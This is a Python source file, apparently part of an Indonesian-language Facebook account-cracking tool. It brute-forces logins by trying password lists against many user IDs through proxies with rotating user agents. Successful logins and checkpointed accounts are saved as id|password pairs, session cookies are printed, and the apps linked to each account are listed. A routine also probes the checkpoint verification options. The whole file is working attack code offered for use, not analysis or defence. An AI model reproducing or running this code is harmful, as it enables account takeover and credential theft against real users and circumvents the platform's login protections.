	sys.stdout.write(f"\r# {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"p.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[PRESHAK -CP]   {idf}  {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}[PRESHAK -OK]  {idf} {pw}')
				print(f'\r {H}Cookie   : {coki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok.append(wrt)
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> IKFAR__IFC <<<<<#